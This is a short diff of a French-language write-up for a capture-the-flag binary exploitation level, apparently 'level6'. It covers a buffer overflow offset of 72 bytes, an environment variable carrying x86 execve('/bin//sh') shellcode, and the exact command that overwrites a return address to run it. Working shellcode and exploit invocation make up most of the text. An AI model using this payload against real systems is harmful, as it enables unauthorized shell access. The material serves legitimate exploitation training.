@@ -1,7 +1,8 @@
-On trouve l'adresse des deux buffers en memoire et on la soustrait pour savoir de combien il faut overflow le premier pour écrire dans le second. On trouve 72, on va donc ecrire 71 a suivi de l'adresse d'un shellcode en memore dans l'environnement qu'on
+On trouve l'adresse des deux buffers en memoire et on la soustrait pour savoir de combien il faut overflow le premier pour écrire dans le second. On trouve 72, on va donc ecrire 72 a suivi de l'adresse d'un shellcode en memore dans l'environnement qu'on
 exporte avec :
 
-export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
+export BINSH=`python -c "print '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
 
 On trouve l'adresse de binsh avec gdb puis on l'incopore dans notre exploit :
 /home/user/level6/level6 `python -c "print 'a' * 72 + '\x47''\xf0''\xff''\xbf'"`
+	
